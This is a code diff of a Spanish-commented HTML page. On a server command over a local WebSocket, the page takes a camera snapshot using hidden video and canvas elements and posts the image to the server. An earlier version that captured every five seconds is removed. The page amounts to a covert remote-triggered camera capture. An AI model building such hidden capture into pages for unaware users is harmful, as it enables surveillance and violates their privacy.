@@ -1,92 +1,120 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura Automática</title>
+    <title>Captura de Imagen Remota</title>
 </head>
 <body>
-    <h1>Captura Automática de Imágenes</h1>
-    <video id="cameraStream" autoplay style="display:none;"></video>
-    <canvas id="snapshotCanvas" style="display:none;"></canvas>
-    
-    <!-- Botón para subir una imagen desde la computadora -->
-    <input type="file" id="imageUploader" accept="image/*">
-    
+    <h1>Captura de Imagen Remota</h1>
+
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
     <script>
-        // Crea una conexión WebSocket con el servidor
+        // Conectar al WebSocket
         const socket = new WebSocket('ws://localhost:80/ws/capture/');
 
-        // Manejar mensajes del servidor
+        // Manejar la conexión abierta
+        socket.onopen = function(event) {
+            console.log("Conectado al WebSocket:", event);
+        };
+
+        // Manejar errores en la conexión
+        socket.onerror = function(error) {
+            console.error("Error en WebSocket:", error);
+        };
+
+        // Cuando llega un mensaje de captura de imagen
         socket.onmessage = function(event) {
             const data = JSON.parse(event.data);
-            if (data.action === 'take_photo') {
-                iniciarCaptura();
-            } else if (data.action === 'take_photo') {
-                // Tomar la foto automáticamente cuando se recibe la acción
-                capturarImagen();
+            console.log("Mensaje recibido del servidor:", data); // Verifica el contenido del mensaje
+
+            // Verifica que el mensaje es para capturar imagen
+            if (data.action === "capturar_imagen") { // Cambia 'message' por 'action'
+                console.log("Iniciando captura de imagen...");
+                activarCamaraYCapturarImagen();
+            } else {
+                console.log("Acción no reconocida:", data.action); // Para depuración
             }
         };
 
-        // Función para iniciar la captura de video
-        function iniciarCaptura() {
+        function activarCamaraYCapturarImagen() {
             // Solicitar acceso a la cámara
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    const video = document.getElementById('cameraStream');
+                    const video = document.getElementById("video");
                     video.srcObject = stream;
-                    video.style.display = 'block'; // Mostrar el video en la página
-                    
-                    // Iniciar la captura de imágenes automáticamente
-                    setInterval(capturarImagen, 5000); // Capturar una imagen cada 5 segundos
+
+                    // Esperar hasta que el video esté listo
+                    video.onloadedmetadata = () => {
+                        // Captura un fotograma después de un pequeño delay para asegurarse de que la cámara está activa
+                        setTimeout(() => {
+                            capturarImagen(stream);
+                        }, 500);
+                    };
                 })
-                .catch(err => console.error('Error al acceder a la cámara: ' + err));
+                .catch(error => {
+                    console.error("Error al acceder a la cámara:", error);
+                });
         }
 
-        // Función para capturar una imagen
-        function capturarImagen() {
-            const video = document.getElementById('cameraStream');
-            const canvas = document.getElementById('snapshotCanvas');
+        function capturarImagen(stream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+
+            // Configurar el tamaño del canvas para que coincida con el video
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
-            // Dibujar el video en el canvas
-            const context = canvas.getContext('2d');
+            // Dibujar el fotograma en el canvas
+            const context = canvas.getContext("2d");
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Convertir el canvas a una imagen base64 en formato JPG
-            const imageData = canvas.toDataURL('image/jpeg', 0.8); // Calidad 0.8 (ajustable)
+            // Convertir la imagen a base64
+            const imagenCapturada = canvas.toDataURL("image/png");
 
-            // Enviar la imagen al servidor
-            socket.send(JSON.stringify({ action: 'save_image', image: imageData }));
+            // Enviar la imagen capturada al servidor
+            enviarImagenAlServidor(imagenCapturada);
+
+            // Detener la transmisión de la cámara
+            stream.getTracks().forEach(track => track.stop());
         }
 
-        // Procesar la imagen cargada desde la computadora
-        document.getElementById('imageUploader').addEventListener('change', function(event) {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const img = new Image();
-                    img.onload = function() {
-                        const canvas = document.getElementById('snapshotCanvas');
-                        canvas.width = img.width;
-                        canvas.height = img.height;
+        function enviarImagenAlServidor(imagen) {
+            fetch("/guardar_imagen/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-CSRFToken": getCookie('csrftoken') // Si estás en Django, incluye el token CSRF
+                },
+                body: JSON.stringify({ imagen })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Imagen enviada correctamente al servidor");
+                } else {
+                    console.error("Error al enviar la imagen:", response.statusText);
+                }
+            })
+            .catch(error => console.error("Error en la petición:", error));
+        }
 
-                        // Dibujar la imagen cargada en el canvas
-                        const context = canvas.getContext('2d');
-                        context.drawImage(img, 0, 0, canvas.width, canvas.height);
-
-                        // Convertir el canvas a una imagen base64 en formato PNG
-                        const imageData = canvas.toDataURL('image/png', 1.0); 
-                        // Enviar la imagen al servidor
-                        socket.send(JSON.stringify({ action: 'save_image', image: imageData }));
-                    };
-                    img.src = e.target.result;
-                };
-                reader.readAsDataURL(file);
+        // Función para obtener el CSRF token en Django (si es necesario)
+        function getCookie(name) {
+            let cookieValue = null;
+            if (document.cookie && document.cookie !== '') {
+                const cookies = document.cookie.split(';');
+                for (let i = 0; i < cookies.length; i++) {
+                    const cookie = cookies[i].trim();
+                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                        break;
+                    }
+                }
             }
-        });
+            return cookieValue;
+        }
     </script>
 </body>
 </html>
